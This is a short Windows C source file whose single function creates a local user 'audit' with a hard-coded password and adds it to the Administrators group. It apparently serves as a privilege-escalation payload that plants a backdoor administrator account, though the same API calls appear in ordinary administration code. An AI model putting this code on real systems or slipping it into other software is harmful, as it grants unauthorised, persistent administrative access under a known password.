#include "adduser.h"


BOOL CreateAdminUserInternal(void)
{
	NET_API_STATUS rc;
	BOOL b;
	DWORD dw;

	USER_INFO_1 ud;
	LOCALGROUP_MEMBERS_INFO_0 gd;
	SID_NAME_USE snu;

	DWORD cbSid = 256;	// 256 bytes should be enough for everybody :)
	BYTE Sid[256];

	DWORD cbDomain = 256 / sizeof(TCHAR);
	TCHAR Domain[256];

	//
	// Create user
	// http://msdn.microsoft.com/en-us/library/aa370649%28v=VS.85%29.aspx
	//

	memset(&ud, 0, sizeof(ud));

	ud.usri1_name = (LPWSTR)TEXT("audit");						// username
	ud.usri1_password = (LPWSTR)TEXT("Test123456789!");				// password
	ud.usri1_priv = USER_PRIV_USER;					// cannot set USER_PRIV_ADMIN on creation
	ud.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT;	// must be set
	ud.usri1_script_path = NULL;

	rc = NetUserAdd(
		NULL,			// local server
		1,				// information level
		(LPBYTE)&ud,
		NULL			// error value
	);

	if (rc != NERR_Success) {
		_tprintf(_T("NetUserAdd FAIL %d 0x%08x\r\n"), rc, rc);
		return FALSE;
	}

	//
	// Get user SID
	// http://msdn.microsoft.com/en-us/library/aa379159(v=vs.85).aspx
	//

	b = LookupAccountName(
		NULL,			// local server
		_T("audit"),	// account name
		Sid,			// SID
		&cbSid,			// SID size
		Domain,			// Domain
		&cbDomain,		// Domain size
		&snu			// SID_NAME_USE (enum)
	);

	if (!b) {
		dw = GetLastError();
		_tprintf(_T("LookupAccountName FAIL %d 0x%08x\r\n"), dw, dw);
		return FALSE;
	}

	//
	// Add user to "Administrators" local group
	// http://msdn.microsoft.com/en-us/library/aa370436%28v=VS.85%29.aspx
	//

	memset(&gd, 0, sizeof(gd));

	gd.lgrmi0_sid = (PSID)Sid;

	rc = NetLocalGroupAddMembers(
		NULL,					// local server
		_T("Administrators"),
		0,						// information level
		(LPBYTE)&gd,
		1						// only one entry
	);

	if (rc != NERR_Success) {
		_tprintf(_T("NetLocalGroupAddMembers FAIL %d 0x%08x\r\n"), rc, rc);
		return FALSE;
	}

	return TRUE;
}